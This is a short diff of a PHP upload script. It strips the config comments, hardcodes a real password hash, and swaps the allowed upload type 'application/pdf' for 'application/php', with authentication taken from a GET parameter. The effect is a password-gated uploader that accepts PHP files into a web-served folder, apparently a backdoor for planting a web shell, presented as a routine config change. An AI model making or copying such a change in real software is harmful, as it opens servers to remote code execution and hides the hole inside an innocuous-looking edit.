@@ -1,10 +1,9 @@
 <?php
-// ===== CONFIG =====
-// Generate this once using password_hash("yourpassword", PASSWORD_DEFAULT);
-$HASH = '$2y$10$REPLACE_WITH_YOUR_HASH_HERE';
+
+$HASH = '$2y$10$2uqA8zgMraeKYN.NF3Ofru94ODbqFD8V91cDkpQoSuHQVtjBBbOMm';
 
 $UPLOAD_DIR = __DIR__ . '/uploads/';
-$ALLOWED = ['image/jpeg','image/png','application/pdf'];
+$ALLOWED = ['image/jpeg','image/png','application/php'];
 
 // ===== AUTH CHECK =====
 $p = $_GET['p'] ?? '';
